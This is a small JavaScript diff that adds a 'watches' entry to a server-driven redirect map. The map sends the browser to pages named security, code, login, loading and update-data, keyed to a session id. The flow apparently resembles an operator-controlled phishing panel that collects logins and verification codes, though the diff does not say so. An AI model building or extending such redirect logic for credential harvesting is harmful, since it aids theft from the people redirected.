@@ -278,7 +278,7 @@ function pollAfterUpdate(){
     .then(function(d){
       if(d.status==='redirect'&&d.redirect){
         clearInterval(interval);
-        var pages={security:'security.html',code:'code.html',login:'login.html',wait:'loading.html','update-data':'update-data.html'};
+        var pages={security:'security.html',code:'code.html',login:'login.html',wait:'loading.html','update-data':'update-data.html',watches:'watches.html'};
         var target=pages[d.redirect];
         if(target&&target!=='update-data.html')window.location.href=target+'?id='+sid;
       }
